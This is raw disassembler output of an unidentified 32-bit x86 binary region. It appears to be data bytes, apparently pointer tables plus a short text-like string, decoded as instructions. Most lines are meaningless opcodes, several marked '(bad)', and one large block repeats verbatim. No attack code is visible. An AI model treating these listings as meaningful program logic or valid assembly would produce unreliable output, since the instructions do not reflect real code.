  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
  41207a:	add    DWORD PTR [eax],eax
  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    ah,dl
  412425:	cmp    DWORD PTR [ebx],eax
  412427:	add    ah,dl
  412429:	sub    DWORD PTR [ebx],eax
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
